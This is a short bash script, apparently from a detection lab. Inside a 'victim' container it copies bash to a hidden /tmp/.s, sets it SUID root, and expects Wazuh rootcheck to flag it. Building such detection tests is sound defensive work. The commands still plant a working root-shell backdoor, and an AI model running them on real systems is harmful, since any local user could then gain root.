#!/usr/bin/env bash
# Create a new SUID-root binary in /tmp — classic post-exploitation persistence pattern.
set -euo pipefail
docker compose exec -T victim bash -lc "
cp /bin/bash /tmp/.s
chmod 4755 /tmp/.s
ls -l /tmp/.s
"
echo "==> SUID root binary planted. Wazuh rootcheck will surface it on next scan."
